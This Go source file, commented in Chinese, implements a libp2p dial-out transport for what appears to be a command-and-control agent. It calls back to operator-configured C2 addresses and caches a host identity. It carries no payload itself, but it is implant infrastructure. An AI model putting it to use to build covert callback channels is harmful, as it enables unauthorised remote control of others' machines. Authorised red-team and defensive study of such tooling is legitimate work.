//go:build libp2p

package main

// Phase5 §4 步骤 4：libp2p 传输的**真实现**（只在 `-tags libp2p` 时编入）。
//
// ★ 为什么用 build tag（§4.2）：agent 是**每次生成时现编**的（pl_main.go:506-536），
//   若无条件 import libp2p，则每一次 e2e.gen_agent() 都要付 60–90s 构建 + 预热模块缓存，
//   而 gen_agent 被**全部 23 项**门禁调用 ⇒ 整个门禁的时序面受威胁。带 tag 时默认产物里
//   连一个 libp2p 字节都没有。
//
// ★ 抽象面直接用 net.Conn（§2.4）：`gostream.Dial` 返回的正是 net.Conn ⇒ 下游
//   （`functions.ConnRead/SendMsg/RecvMsg`、`main.go:202-227` 的帧循环）**零改动**。
//   注意 `network.Stream` **不满足** net.Conn（缺地址方法），所以必须走 gostream。

import (
	"context"
	"errors"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/libp2p/go-libp2p"
	libcrypto "github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/core/protocol"
	"github.com/libp2p/go-libp2p/p2p/muxer/yamux"
	"github.com/libp2p/go-libp2p/p2p/net/gostream"
	"github.com/libp2p/go-libp2p/p2p/security/noise"
	"github.com/libp2p/go-libp2p/p2p/transport/tcp"
	ma "github.com/multiformats/go-multiaddr"

	"gopher/utils"
)

// defaultLibp2pProtocol 是 C2 流所用的 protocol id；profile 可覆盖。
const defaultLibp2pProtocol = "/gopher/1.0.0"

// defaultLibp2pDialTimeout 是建连 + 开流的**总**预算。
// ★ 刻意远离 §4 步骤 5 那个 200ms：libp2p 要握手（Noise）+ 选路，1–5s 是常态。
const defaultLibp2pDialTimeout = 30 * time.Second

// host 在进程内**只建一次**并缓存：libp2p.New 要起后台 goroutine + 建连接管理器，
// 每次拨号都建一遍会比 dial 本身还贵（§4 步骤 4 的"并缓存"）。
var (
	hostOnce sync.Once
	hostInst host.Host
	hostErr  error
)

func libp2pHost(profile utils.Profile) (host.Host, error) {
	hostOnce.Do(func() {
		opts := []libp2p.Option{
			// agent 是**拨号方**（§4.0）：不监听，也让链接器别把 listener 那套拉进来。
			libp2p.NoListenAddrs,
			libp2p.NoTransports,
			libp2p.Transport(tcp.NewTCPTransport),
			libp2p.Security(noise.ID, noise.New),
			libp2p.Muxer(yamux.ID, yamux.DefaultTransport),
		}
		if len(profile.Libp2pPrivKey) > 0 {
			sk, err := libcrypto.UnmarshalPrivateKey(profile.Libp2pPrivKey)
			if err != nil {
				// ★ 不静默降级成临时身份：那会让"服务端认不出这个 agent"变成一个
				//   无从查起的神秘现象。宁可这里就报错。
				hostErr = fmt.Errorf("libp2p: unmarshal privkey: %w", err)
				return
			}
			opts = append(opts, libp2p.Identity(sk))
		}
		// Libp2pPrivKey 为空 ⇒ libp2p 自生成临时身份。对**拨号方**这是可接受的
		// （每次运行 peer id 不同，与 TCP 源端口随机同类），服务端按对方给的 peer id 记账。
		hostInst, hostErr = libp2p.New(opts...)
	})
	return hostInst, hostErr
}

// dialLibp2p 建 host → Connect → gostream.Dial，返回一个满足 net.Conn 的流。
//
// 地址来源：优先 `profile.Libp2pAddrs`（多地址，逐个试），为空则退回调用点传进来的
// `addr` —— 这样 operator 也可以直接把 multiaddr 填在普通的 callback_addresses 里。
func dialLibp2p(profile utils.Profile, addr string) (net.Conn, error) {
	h, err := libp2pHost(profile)
	if err != nil {
		return nil, err
	}

	addrs := profile.Libp2pAddrs
	if len(addrs) == 0 && addr != "" {
		addrs = []string{addr}
	}
	if len(addrs) == 0 {
		return nil, errors.New("libp2p: profile has neither l2p_addrs nor callback_addresses")
	}

	proto := protocol.ID(profile.Libp2pProtocol)
	if profile.Libp2pProtocol == "" {
		proto = defaultLibp2pProtocol
	}
	timeout := time.Duration(profile.Libp2pDialTimeout) * time.Second
	if timeout <= 0 {
		timeout = defaultLibp2pDialTimeout
	}

	// 逐个地址试，与 main.go 的 addrIndex 轮询同构；全部失败才返回最后一个错。
	var lastErr error
	for _, s := range addrs {
		maddr, err := ma.NewMultiaddr(s)
		if err != nil {
			lastErr = fmt.Errorf("libp2p: bad multiaddr %q: %w", s, err)
			continue
		}
		ai, err := peer.AddrInfoFromP2pAddr(maddr)
		if err != nil {
			lastErr = fmt.Errorf("libp2p: no peer id in %q: %w", s, err)
			continue
		}
		ctx, cancel := context.WithTimeout(context.Background(), timeout)
		if err := h.Connect(ctx, *ai); err != nil {
			cancel()
			lastErr = err
			continue
		}
		conn, err := gostream.Dial(ctx, h, ai.ID, proto)
		cancel()
		if err != nil {
			lastErr = err
			continue
		}
		return conn, nil
	}
	return nil, lastErr
}
